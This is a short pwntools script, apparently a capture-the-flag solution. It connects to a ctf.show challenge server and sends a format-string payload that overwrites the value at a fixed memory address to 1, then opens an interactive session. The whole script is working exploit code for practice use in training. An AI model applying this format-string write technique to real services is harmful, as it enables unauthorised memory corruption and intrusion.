from pwn import*
context.log_level = "debug"
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28145)
check = 0x804B040
payload = fmtstr_payload(11, {check:1})  
io.sendline(payload)
io.interactive()
